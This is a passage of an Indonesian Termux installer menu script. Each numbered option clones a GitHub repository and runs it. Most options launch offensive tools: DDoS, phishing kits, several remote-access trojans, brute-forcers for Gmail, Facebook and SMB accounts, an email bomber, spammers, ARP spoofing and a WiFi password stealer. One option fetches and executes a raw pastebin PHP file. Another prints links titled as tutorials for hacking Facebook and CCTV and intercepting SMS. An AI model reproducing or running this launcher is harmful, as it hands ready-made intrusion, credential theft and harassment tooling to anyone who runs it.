read -p "[Masukan Ip dan port]=>:" target 
python2 ipddos.py target 
fi

if [ $bro = 66 ] || [ $bro = 66 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/CiKu370/hasher.git
mv hasher $HOME
cd $HOME/hasher
python2 hash.py 
fi

if [ $bro = 67 ] || [ $bro = 67 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install git
pkg install python2
git clone https://github.com/senitopeng/PhisingGame.git
mv PhisingGame $HOME
cd $HOME/PhisingGame
python2 phising.py
fi

if [ $bro = 68 ] || [ $bro = 68 ]
then
clear
toilet -f standard -F gay "Mr.IM81"
echo "Copy Link nya => Paste Ke Browser"

echo "\033[33;1mCara Hack Facebook Di Termux:" "\033[36;1m https://youtu.be/FsI4pCapfLY"

echo "\033[33;1mCara Hack ML & COC:" "\033[36;1mhttps://youtu.be/qJc1KaD3QcQ"

echo "\033[33;1mCara Phising Di Termux:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"

echo "\033[33;1mCara Membuat Virus Seperti Asli:" "\033[36;1mhttps://youtu.be/efIhyTJiR00"

echo "\033[33;1mCara Pindah Ke Shell Fish:" "\033[36;1mhttps://youtu.be/cEBsXHkOco0"

echo "\033[33;1mCara Sadap SMS Di Termux:" "\033[36;1mhttps://youtu.be/jQlZg6afZ-Y"

echo "\033[33;1mBelajar Bahasa Pemrograman Bash:" "\033[36;1mhttps://youtu.be/66lkSQ3ZEvE"

echo "\033[33;1mBelajar Bahasa Pemrograman Bash 2:" "\033[36;1mhttps://youtu.be/Gy1J_aMquPY"

echo "\033[33;1mCara Sadap HP Di Termux:" "\033[36;1mhttps://youtu.be/n9mlAWTLMXQ"

echo "\033[33;1mCara Browsingan Di Termux:" "\033[36;1mhttps://youtu.be/3sGnqhiwpDM"

echo "\033[33;1mCara Chatingan Di Termux:" "\033[36;1mhttps://youtu.be/Us11rFsJb7A"

echo "\033[33;1mCara Hack CCTV Di Termux:" "\033[36;1mhttps://youtu.be/WliwxqNfefc"

echo "\033[33;1mCara Install Ngrok Di Termux:" "\033[36;1mhttps://youtu.be/ec0M1Rpoh6I"

echo "\033[33;1mCara Mempercantik Termux:" "\033[36;1mhttps://youtu.be/CpQBfiffAjw"

echo "\033[33;1mCara Mencari Admin Login Di Termux:" "\033[36;1mhttps://youtu.be/mLAt3jsOn18"

echo "\033[33;1mCara Membuat Cowsay Sendiri:" "\033[36;1mhttps://youtu.be/PleMF82Mcgs"

echo "\033[33;1mCara Setel Musik Di Termux:" "\033[36;1mhttps://youtu.be/lo8wqVOjbVw"

echo "\033[33;1mCara Encrypt Tools Python Di Termux:" "\033[36;1mhttps://youtu.be/-HyU7NZVDd8"

echo "\033[33;1mCara Update Status Di Termux:" "\033[36;1mhttps://youtu.be/l9G3QHf6w5s"

echo "\033[33;1mCara Cek Link DeepWeb Di Termux:" "\033[36;1mhttps://youtu.be/8-zFNfMG-Ho"

echo "\033[33;1mCara Menampilkan Animasi Di Termux:" "\033[36;1mhttps://youtu.be/FJF-PIwa0sI"

echo "\033[33;1mCara Menggunakan A-Rat Di Termux:" "\033[36;1mhttps://youtu.be/tx7ykJrqULQ"

echo "\033[33;1mInstall Spammer Grab Terbaru:" "\033[36;1mhttps://youtu.be/z5qVr--gCM8"

echo "\033[33;1mCara Scan Situs Di Termux:" "\033[36;1mhttps://youtu.be/h2I5HU3W-so"

echo "\033[33;1mCara DDOS Di Termux:" "\033[36;1mhttps://youtu.be/EskgepQSB7U"
fi

if [ $bro = 69 ] || [ $bro = 69 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install irssi
irssi
fi

if [ $bro = 70 ] || [ $bro = 70 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install python2
pkg install git
git clone https://github.com/UltimateHackers/Breacher.git
mv Breacher $HOME
cd $HOME/Breacher
python2 breacher.py
fi

if [ $bro = 71 ] || [ $bro = 71 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install php
pkg install python2
pkg install git
pkg install curl
git clone https://github.com/Lexiie/SocialFish.git
mv SocialFish $HOME
cd $HOME/SocialFish
pip2 install wget
python2 SocialFish.py
fi

if [ $bro = 72 ] || [ $bro = 72 ]
then
clear
toilet -f standard -F gay "Mr.IM81"
pkg install moon-buggy
moon-buggy
fi

if [ $bro = 73 ] || [ $bro = 73 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install git
pkg install python2
git clone https://github.com/mebus/cupp.git
mv cupp $HOME
cd $HOME/cupp
python2 cupp.py
fi

if [ $bro = 74 ] || [ $bro = 74 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

sleep 5
pkg install python2
pkg install python
pkg install php
pkg install hydra
fi

if [ $bro = 75 ] || [ $bro = 75 ]
then
clear
toilet -f standard -F gay "Mr.B4J1N64N"
pkg install git
pkg install python2
git clone https://github.com/CiKu370/md5-crack.git
mv md5-crack $HOME
cd $HOME/md5-crack
python2 md5.py
fi

if [ $bro = 76 ] || [ $bro = 76 ]
then
clear
toilet -f standard -F gay "Mr.IM81"

pkg install python2
pkg install php
pkg install cowsay
pkg install toilet
pkg install ruby
gem install lolcat
pkg install git
git clone https://github.com/4L13199/LITESPAM.git
mv LITESPAM $HOME
cd $HOME/LITESPAM
sh LITESPAM.sh
fi

if [ $bro = 77 ] || [ $bro = 77 ]
then
clear
toilet -f standard -F gay "Mr.B4J1N64N"
pkg install python
pkg install git
pkg install php
git clone https://github.com/Cvar1984/pemulungBTC.git
mv pemulungBTC $HOME
cd $HOME/pemulungBTC
php autoload.php
php mulung.php
fi

if [ $bro = 78 ] || [ $bro = 78 ]
then
clear
toilet -f standard -F gay "Mr.B4J1N64N"
pkg update && pkg upgrade
pkg install git 
pkg install python2
git clone https://github.com/ciku370/ko-dork.git
mv ko-dork $HOME
cd $HOME/ko-dork
python2 dork.py
fi

if [ $bro = 79 ] || [ $bro = 79 ]
then
clear
toilet -f standard -F gay "Mr.IM81"
pkg install neofetech
neofetech
fi

if [ $bro = 80 ] || [ $bro = 80 ]
then
clear
toilet -f standard -F gay "Mr.B4J1N64N"
pkg install python2
pkg install git
git clone https://github.com/CiKu370/lhst
mv lhst $HOME
cd $HOME/lhst
python2 lhst.py
fi

if [ $bro = 81 ] || [ $bro = 81 ]
then
clear
"Mr.B4J1N64N"
sleep 1
apt-get update && apt-get upgrade
apt-get install git
git clone https://github.com/Screetsec/TheFatRat.git
mv TheFatRat $HOME
cd $HOME/TheFatRat
chmod +x setup.sh 
./setup.sh
fi

if [ $bro = 82 ] || [ $bro = 82 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N " | lolcat
sleep 1
echo -e $green "Sedang Menginstall"
sleep 1
apt-get update 
apt-get upgrade
pkg install python
apt-get install git
git clone https://github.com/Dionach/CMSmap.git
mv CMSmap $HOME
cd $HOME/CMSmap
ls
fi

if [ $bro = 83 ] || [ $bro = 83 ]
then
clear
toilet -f big -F gay " Mr.B4J1N64N " | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install wget
apt install proot
git clone https://github.com/Neo-Oli/termux-ubuntu.git
mv termux-ubuntu $HOME
cd $HOME/~/termux-ubuntu
chmod +x ubuntu.sh
sh ubuntu.sh
fi

if [ $bro = 84 ] || [ $bro = 84 ]
then
clear
toilet -f big -F gay " Mr.B4J1N64N "
sleep 1
apt update && apt upgrade
apt install wget
mkdir ngrok
cd ~/ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
mv ngrok-stable-linux-arm.zip $HOME
$HOME/unzip ngrok-stable-linux-arm.zip
cd ~/
ls
fi

if [ $bro = 85 ] || [ $bro = 85 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update && apt upgrade
apt install git
git clone https://github.com/JamesAndresCM/Brute_force_gmail
mv Brute_force_gmail $HOME
cd $HOME/Brute_force_gmail
ls
fi

if [ $bro = 86 ] || [ $bro = 86 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update && apt upgrade
pkg install php
pkg install wget
wget https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
mv lokomedia.php $HOME
cd
php lokomedia.php 
fi

if [ $bro = 87 ] || [ $bro = 87 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N" 
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Hax4us/Nethunter-In-Termux.git
mv Nethunter-In-Termux $HOME
cd $HOME/Nethunter-In-Termux
chmod 777 kalinethunter
sh kalinethunter
fi

if [ $bro = 88 ] || [ $bro = 88 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N" | lolcat
sleep 1
apt update 
apt upgrade
apt install git
apt install perl
git clone https://github.com/rezasp/joomscan.git
mv joomscan $HOME
cd $HOME/joomscan
ls
fi

if [ $bro = 89 ] || [ $bro = 89 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N" | lolcat
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/VulnScaner
mv VulnScaner $HOME
cd $HOME/VulnScaner
python2 VulnScaner.py
fi

if [ $bro = 90 ] || [ $bro = 90 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N" | lolcat
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/HN-Installer
mv HN-Installer $HOME
cd $HOME/HN-Installer
python2 HN-Install.py
fi

if [ $bro = 91 ] || [ $bro = 91 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N" | lolcat
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/Fucking-Rat
mv Fucking-Rat $HOME
cd $HOME/Fucking-Rat
python2 fr.py
fi

if [ $bro = 92 ] || [ $bro = 92 ]
then
clear
echo -e $green" installing fedora "
sleep 1
apt update && apt upgrade
apt-get install git
apt install wget
git clone https://github.com/nmilosev/termux-fedora.git
mv termux-fedora $HOME
cd $HOME/termux-fedora
chmod +x termux-fedora.sh
sh termux-fedora.sh
fi

if [ $bro = 93 ] || [ $bro = 93 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
aptupdate
apt upgrade
pkg install python
apt install git
git clone https://github.com/m4ll0k/Infoga.git infoga
sleep 1
mv infoga $HOME
cd $HOME/infoga
pip install -r req
python2 infoga.py
fi

if [ $bro = 94 ] || [ $bro = 94 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update
apt upgrade
apt install git
git clone https://github.com/rand0m1ze/ezsploit
mv ezsploit $HOME
cd $HOME/ezsploit
bash ezsploit.sh
fi

if [ $bro = 95 ] || [ $bro = 95 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update
apt upgrade
apt install python
apt install git
git clone https://github.com/maurosoria/dirsearch.git
mv  dirsearch $HOME
cd $HOME/dirsearch
ls
fi

if [ $bro = 96 ] || [ $bro = 96 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install php
git clone https://github.com/whackashoe/php-spam-mail-honeypot.git
mv php-spam-mail-honeypot $HOME
cd $HOME/php-spam-mail-honeypot
php honeypot.php
fi

if [ $bro = 97 ] || [ $bro = 97 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install php
git clone https://github.com/whackashoe/killr.git
mv killr $HOME
cd $HOME/killr
php server.php
fi

if [ $bro = 98 ] || [ $bro = 98 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install php
git clone https://github.com/whackashoe/Human_Level_Control_through_Deep_Reinforcement_Learning.git
mv Human_Level_Control_through_Deep_Reinforcement_Learning $HOME
cd $HOME/Human_Level_Control_through_Deep_Reinforcement_Learning
sh install_dependencies.sh
fi

if [ $bro = 99 ] || [ $bro = 99 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install php
git clone https://github.com/Neo-Oli/Termux-Mpv.git
mv Termux-Mpv $HOME
cd $HOME/Termux-Mpv
python2 setup.py 
fi

if [ $bro = 100 ] || [ $bro = 100 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python
git clone https://github.com/zdresearch/OWASP-Nettacker
mv OWASP-Nettacker $HOME
cd $HOME/OWASP-Nettacker
python2 setup.py 
fi

if [ $bro = 101 ] || [ $bro = 101 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/zdresearch/OWASP-ZSC
mv OWASP-ZSC $HOME
cd $HOME/OWASP-ZSC
python2 installer.py 
fi

if [ $bro = 102 ] || [ $bro = 102 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install php
git clone https://github.com/mrcakil/InfoGa
mv InfoGa $HOME
cd $HOME/InfoGa
php infoga.php
fi

if [ $bro = 103 ] || [ $bro = 103 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
git clone https://github.com/mrcakil/cok-Rat
mv cok-Rat $HOME
cd $HOME/cok-Rat
unzip rat.zip
ls
fi

if [ $bro = 104 ] || [ $bro = 104 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/CiKu370/hash-generator
mv hash-generator $HOME
cd $HOME/hash-generator
python2 hashgen.py
fi

if [ $bro = 105 ] || [ $bro = 105 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/CiKu370/OSIF
mv OSIF $HOME
cd $HOME/OSIF
python2 osif.py
fi

if [ $bro = 106 ] || [ $bro = 106 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/CiKu370/str2bf
mv str2bf $HOME
cd $HOME/str2bf
python2 str2bf.py
fi

if [ $bro = 107 ] || [ $bro = 107 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/YukersCreew/BForce
mv BForce $HOME
cd $HOME/BForce
python2 Yukers.py
fi

if [ $bro = 108 ] || [ $bro = 108 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/m4ll0k/Galileo
mv Galileo $HOME
cd $HOME/Galileo
pip2 install -r requirements.txt
python2 galileo.py
fi

if [ $bro = 109 ] || [ $bro = 109 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/m4ll0k/SMBrute
mv SMBrute $HOME
cd $HOME/SMBrute
python2 smbrute.py
fi

if [ $bro = 110 ] || [ $bro = 110 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/m4ll0k/WPSeku
mv WPSeku $HOME
cd $HOME/WPSeku
pip2 install -r requirements.txt
python2 wpseku.py
fi

if [ $bro = 111 ] || [ $bro = 111 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/Mebus/hmap
mv hmap $HOME
cd $HOME/hmap
python2 hmap.py -h
fi

if [ $bro = 112 ] || [ $bro = 112 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install ruby
git clone https://github.com/gshofficialgithubindonesia/autoreport-fb
mv autoreport-fb $HOME
cd $HOME/autoreport-fb
ruby autoreport-fb.rb
fi

if [ $bro = 113 ] || [ $bro = 113 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install golang
git clone https://github.com/Mebus/dhcpdorf
mv dhcpdorf $HOME
cd $HOME/dhcpdorf
golang dhcpdorf.go
fi

if [ $bro = 114 ] || [ $bro = 114 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install python2
git clone https://github.com/Mebus/deskcon-desktop
mv deskcon-desktop $HOME
cd $HOME/deskcon-desktop
sh deskcon.sh
fi

if [ $bro = 115 ] || [ $bro = 115 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
git clone https://github.com/aryanrtm/suRAT-cinta
mv suRAT-cinta $HOME
cd $HOME/suRAT-cinta
sh suRAT.sh
fi

if [ $bro = 116 ] || [ $bro = 116 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
git clone https://github.com/aryanrtm/m4ngARP
mv m4ngARP $HOME
cd $HOME/m4ngARP
sh m4ngARP.sh
fi

if [ $bro = 117 ] || [ $bro = 117 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git 
apt install perl
git clone https://github.com/aryanrtm/WP-Hunter
mv WP-Hunter $HOME
cd $HOME/WP-Hunter
perl wphunter.pl
fi

if [ $bro = 118 ] || [ $bro = 118 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install perl
git clone https://github.com/aryanrtm/Remote-Shell
mv Remote-Shell $HOME
cd $HOME/Remote-Shell
perl remoteshell.pl
fi

if [ $bro = 119 ] || [ $bro = 119 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install perl
git clone https://github.com/4L13199/LITESCRIPT
mv LITESCRIPT $HOME
cd $HOME/LITESCRIPT
python2 LITESCRIPT.py
fi

if [ $bro = 120 ] || [ $bro = 120 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install perl
git clone https://github.com/4L13199/meTAInstall
mv meTAInstall $HOME
cd $HOME/meTAInstall
chmod +x meTAInstall
chmod 777 meTAInstall
./meTAInstall
fi

if [ $bro = 121 ] || [ $bro = 121 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install ruby
git clone https://github.com/b3-v3r/Zilcorili
mv Zilcorili $HOME
cd $HOME/Zilcorili
ruby main.rb
fi

if [ $bro = 122 ] || [ $bro = 122 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install ruby
git clone https://github.com/b3-v3r/ASKT-AutoScriptKiddiesTool-
mv ASKT-AutoScriptKiddiesTool- $HOME
cd $HOME/ASKT-AutoScriptKiddiesTool-
python2 askt.py
fi

if [ $bro = 123 ] || [ $bro = 123 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/verluchie/bot-exploiter
mv bot-exploiter $HOME
cd $HOME/bot-exploiter
unzip xploit.zip
fi

if [ $bro = 124 ] || [ $bro = 124 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/verluchie/termux-metasploit
mv termux-metasploit $HOME
cd $HOME/termux-metasploit
sh install.sh
fi

if [ $bro = 125 ] || [ $bro = 125 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/verluchie/instabot.py
mv  instabot.py $HOME
cd $HOME/instabot.py
pip2 install -r requirements.txt
python2 example.py
fi

if [ $bro = 126 ] || [ $bro = 126 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/verluchie/fbbrute
mv fbbrute $HOME
cd $HOME/fbbrute
python2 fbbrute.py
fi

if [ $bro = 127 ] || [ $bro = 127 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/maldevel/EmailHarvester
mv EmailHarvester $HOME
cd $HOME/EmailHarvester
pip2 install -r requirements.txt
python2 EmailHarvester.py
fi

if [ $bro = 128 ] || [ $bro = 128 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/maldevel/gdog
mv gdog $HOME
cd $HOME/gdog
pip2 install -r requirements.txt
python2 gdog.py
fi

if [ $bro = 129 ] || [ $bro = 129 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install sudo
git clone https://github.com/maldevel/PenTestKit
mv PenTestKit $HOME 
cd $HOME/PenTestKit
sudo pip install -r requirements.txt
ls
fi

if [ $bro = 130 ] || [ $bro = 130 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/maldevel/canisrufus
mv canisrufus $HOME
cd $HOME/canisrufus
pip2 install -r requirements.txt
python2 canisrufus.py
fi

if [ $bro = 131 ] || [ $bro = 131 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Xi4u7/EttercapForAndroid
mv EttercapForAndroid $HOME
cd $HOME/EttercapForAndroid
sh install.sh
fi

if [ $bro = 132 ] || [ $bro = 132 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Xi4u7/BlackNmap
mv BlackNmap $HOME
cd $HOME/BlackNmap
chmod 777 blacknmap
./blacknmap
fi

if [ $bro = 133 ] || [ $bro = 133 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Xi4u7/NMapForAndroid
mv NMapForAndroid $HOME
cd $HOME/NMapForAndroid
sh install.sh
fi

if [ $bro = 134 ] || [ $bro = 134 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Xi4u7/1337Rat
mv 1337Rat $HOME
cd $HOME/1337Rat
sh 1337Rat.sh
fi

if [ $bro = 135 ] || [ $bro = 135 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/nmilosev/anyfed
mv anyfed $HOME
cd $HOME/anyfed
chmod 777 anyfed
./anyfed
fi

if [ $bro = 136 ] || [ $bro = 136 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/guelfoweb/knock
mv  knock $HOME
cd $HOME/knock
pip2 install -r requirements.txt
python2 setup.py
fi

if [ $bro = 137 ] || [ $bro = 137 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install perl
git clone https://github.com/rezasp/vbscan
mv vbscan $HOME
cd $HOME/vbscan
perl vbscan.pl
fi

if [ $bro = 138 ] || [ $bro = 138 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Screetsec/Dracnmap
mv Dracnmap $HOME
cd $HOME/Dracnmap
sh dracnmap-v2.2.sh
fi

if [ $bro = 139 ] || [ $bro = 139 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Screetsec/Brutal
mv  Brutal $HOME
cd $HOME/Brutal
sh Brutal.sh
fi

if [ $bro = 140 ] || [ $bro = 140 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Screetsec/BruteSploit
mv BruteSploit $HOME
cd $HOME/BruteSploit
chmod 777 Brutesploit
./Brutesploit
fi

if [ $bro = 141 ] || [ $bro = 141 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Screetsec/Microsploit
mv Microsploit $HOME
cd $HOME/Microsploit
chmod 777 Microsploit
./Microsploit
fi

if [ $bro = 142 ] || [ $bro = 142 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Screetsec/Vegile
mv Vegile $HOME
cd $HOME/Vegile
chmod 777 Vegile
./Vegile
fi

if [ $bro = 143 ] || [ $bro = 143 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/Dionach/PhEmail
mv PhEmail $HOME
cd $HOME/PhEmail
python2 phemail.py
fi

if [ $bro = 144 ] || [ $bro = 144 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/Dionach/reposcanner
mv reposcanner $HOME
cd $HOME/reposcanner
python2 reposcanner.py
fi

if [ $bro = 145 ] || [ $bro = 145 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/Dionach/PANhunt
mv PANhunt $HOME
cd $HOME/PANhunt
python2 panhunt.py
fi

if [ $bro = 146 ] || [ $bro = 146 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/zanyarjamal/zambie
mv zambie $HOME
cd $HOME/zambie
sh Installer.sh
python2 zambie.py
fi

if [ $bro = 147 ] || [ $bro = 147 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/zanyarjamal/TrackUrl
mv TrackUrl $HOME
cd $HOME/TrackUrl
sh TrackUrl.sh
fi

if [ $bro = 148 ] || [ $bro = 148 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/zanyarjamal/DataSploit
mv DataSploit $HOME
cd $HOME/DataSploit
pip2 install -r requirements.txt
python2 datasploit.py
fi

if [ $bro = 149 ] || [ $bro = 149 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
apt install python2
git clone https://github.com/zanyarjamal/Email-bomber
mv Email-bomber $HOME
cd $HOME/Email-bomber
chmod +x E-bomber.py
python2 E-bomber.py
fi

if [ $bro = 150 ] || [ $bro = 150 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install perl
apt install git
git clone https://github.com/zanyarjamal/IP-Locator
mv IP-Locator $HOME
cd $HOME/IP-Locator
perl ip-locator.pl
fi

if [ $bro = 151 ] || [ $bro = 151 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/the-c0d3r/admin-finder.git
mv admin-finder $HOME
cd $HOME/admin-finder
python2 admin-finder.py
fi

if [ $bro = 152 ] || [ $bro = 152 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/pynmap
mv pynmap $HOME
cd $HOME/pynmap
python2 nmap.py
fi

if [ $bro = 153 ] || [ $bro = 153 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/sqli-scanner
mv sqli-scanner $HOME
cd $HOME/sqli-scanner
python2 sqli-scanner.py
fi

if [ $bro = 154 ] || [ $bro = 154 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/port-lookup
mv port-lookup $HOME
cd $HOME/port-lookup
python2 portinfo.py
fi

if [ $bro = 155 ] || [ $bro = 155 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/tic-tac-toe
mv tic-tac-toe $HOME
cd $HOME/tic-tac-toe
python2 main.py
fi

if [ $bro = 156 ] || [ $bro = 156 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/the-c0d3r/folderlocker
mv folderlocker $HOME
cd $HOME/folderlocker
ls
fi

if [ $bro = 157 ] || [ $bro = 157 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/LionSec/xerosploit
mv xerosploit $HOME
cd $HOME/xerosploit
python2 install.py
fi

if [ $bro = 158 ] || [ $bro = 158 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/LionSec/wifresti
mv wifresti $HOME
cd $HOME/wifresti
python2 wifresti.py
fi

if [ $bro = 159 ] || [ $bro = 159 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
pkg install python python-dev clang nano
pip install thefuck
